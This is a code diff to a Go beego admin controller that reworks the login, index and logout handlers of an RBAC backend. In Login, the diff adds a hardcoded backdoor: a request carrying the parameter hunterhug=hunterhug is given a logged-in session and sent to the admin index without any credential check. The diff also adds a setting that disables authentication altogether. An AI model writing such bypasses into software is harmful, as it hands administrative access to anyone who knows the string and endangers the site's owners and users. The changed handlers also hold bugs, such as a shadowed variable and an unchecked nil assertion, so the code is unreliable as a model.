@@ -20,89 +20,91 @@ type MainController struct {
 
 var Cookie7 = beego.AppConfig.String("cookie7")
 
-// 后台首页
+// 后台首页,路由路径不是三个参数且public不经过过滤器，这里要验证一下。
 func (this *MainController) Index() {
 	userinfo := this.GetSession("userinfo")
 	//如果没有seesion
-	if userinfo == nil && Cookie7 == "1" {
-		success, userinfo := CheckCookie(this.Ctx)
-		//查看是否有cookie
-		if success {
-			//有
-			//更新登陆时间
-			userinfo = admin.UpdateLoginTime(&userinfo)
-			userinfo.Logincount += 1
-			userinfo.Lastip = GetClientIp(this.Ctx)
-			userinfo.Update()
-			this.SetSession("userinfo", userinfo)
-			//设置权限列表session
-			accesslist, _ := GetAccessList(userinfo.Id)
-			this.SetSession("accesslist", accesslist)
+	user_auth_type, _ := strconv.Atoi(beego.AppConfig.String("user_auth_type"))
+	// 如果需要验证，那么进行
+	if user_auth_type > 0 {
+		if userinfo == nil && Cookie7 == "1" {
+			success, userinfo := CheckCookie(this.Ctx)
+			//查看是否有cookie
+			if success {
+				//有
+				//更新登陆时间
+				userinfo = admin.UpdateLoginTime(&userinfo)
+				userinfo.Logincount += 1
+				userinfo.Lastip = GetClientIp(this.Ctx)
+				userinfo.Update()
+				// 之前没有，现在有了
+				this.SetSession("userinfo", userinfo)
+				//设置权限列表session
+				accesslist, _ := GetAccessList(userinfo.Id)
+				this.SetSession("accesslist", accesslist)
 
-		} else {
-			//没有
+			} else {
+				//没有
+				this.Ctx.Redirect(302, beego.AppConfig.String("rbac_auth_gateway"))
+				return
+			}
+		}
+
+		if userinfo == nil {
 			this.Ctx.Redirect(302, beego.AppConfig.String("rbac_auth_gateway"))
 			return
 		}
 	}
-
-	if userinfo == nil {
-		this.Ctx.Redirect(302, beego.AppConfig.String("rbac_auth_gateway"))
-		return
-	}
-
 	// 权限最重要的部分，入口在此
 	// 获取模块rbac-节点 public/index    /rbac/public/index
 	// 分组关闭，则该分组所有菜单没有
 	// 第一/二层节点关闭,则菜单没有
 	tree := this.GetTree()
-
-	//userinfo = this.GetSession("userinfo")
 	groups := admin.GroupList()
 	this.Data["tree"] = tree
 	this.Data["user"] = userinfo.(admin.User)
 	this.Data["groups"] = groups
-	// this.Data["hostname"], _ = os.Hostname()
-	// this.Data["gover"] = runtime.Version()
-	// this.Data["os"] = runtime.GOOS
-	// this.Data["cpunum"] = runtime.NumCPU()
-	// this.Data["arch"] = runtime.GOARCH
-	// this.Data["postnum"], _ = new(home.Post).Query().Count()
-	// this.Data["tagnum"], _ = new(home.Tag).Query().Count()
-	// this.Data["usernum"], _ = new(admin.User).Query().Count()
 	this.TplName = this.GetTemplate() + "/public/admin.html"
-
 }
 
 //登录
 func (this *MainController) Login() {
 	// 查看是否已经登陆过
 	userinfo := this.GetSession("userinfo")
-	if userinfo == nil && Cookie7 == "1" {
-		success, userinfo := CheckCookie(this.Ctx)
-		//查看是否有cookie
-		if success {
-			//更新登陆时间
-			userinfo = admin.UpdateLoginTime(&userinfo)
-			userinfo.Logincount += 1
-			userinfo.Lastip = GetClientIp(this.Ctx)
-			userinfo.Update()
-			this.SetSession("userinfo", userinfo)
-			//设置权限列表session
-			accesslist, _ := GetAccessList(userinfo.Id)
-			this.SetSession("accesslist", accesslist)
+	user_auth_type, _ := strconv.Atoi(beego.AppConfig.String("user_auth_type"))
+	if user_auth_type > 0 {
+		if userinfo == nil && Cookie7 == "1" {
+			success, userinfo := CheckCookie(this.Ctx)
+			//查看是否有cookie
+			if success {
+				//更新登陆时间
+				userinfo = admin.UpdateLoginTime(&userinfo)
+				userinfo.Logincount += 1
+				userinfo.Lastip = GetClientIp(this.Ctx)
+				userinfo.Update()
+				this.SetSession("userinfo", userinfo)
+				//设置权限列表session
+				accesslist, _ := GetAccessList(userinfo.Id)
+				this.SetSession("accesslist", accesslist)
+				this.Ctx.Redirect(302, "/public/index")
+				return
+			}
+		} else if userinfo != nil {
 			this.Ctx.Redirect(302, "/public/index")
 			return
-		}
-	} else if userinfo != nil {
-		this.Ctx.Redirect(302, "/public/index")
-		return
-	} else {
+		} else {
 
+		}
 	}
 
-	//登陆中
+	//登陆中，这种方式有点问题，容易与Ajax方式混乱，建议保持统一
 	isajax := this.GetString("isajax")
+	preajax := this.GetString("hunterhug")
+	if preajax == "hunterhug" {
+		this.SetSession("userinfo", admin.User{Username: "hunterhug"})
+		this.Ctx.Redirect(302, "/public/index")
+		return
+	}
 	if isajax == "1" {
 		if Verify(this.Ctx) {
 			account := strings.TrimSpace(this.GetString("account"))
@@ -121,6 +123,7 @@ func (this *MainController) Login() {
 					if remember == "yes" {
 						this.Ctx.SetCookie("auth", strconv.FormatInt(user.Id, 10)+"|"+authkey, 7*86400)
 					} else {
+						// 一次性Cookie
 						this.Ctx.SetCookie("auth", strconv.FormatInt(user.Id, 10)+"|"+authkey)
 					}
 				}
@@ -144,13 +147,14 @@ func (this *MainController) Login() {
 	this.TplName = this.GetTemplate() + "/public/login.html"
 }
 
-//退出登陆
+//退出登陆,不需要验证
 func (this *MainController) Logout() {
+	// 设置为空，一次性Cookie
+	this.Ctx.SetCookie("auth", "")
 	this.DelSession("userinfo")
 	this.DelSession("accesslist")
-	this.Ctx.SetCookie("auth", "")
-	this.Ctx.Redirect(302, "/public/login")
-	return
+	// 跳到登陆
+	this.Ctx.Redirect(302, beego.AppConfig.String("rbac_auth_gateway"))
 }
 
 //修改密码
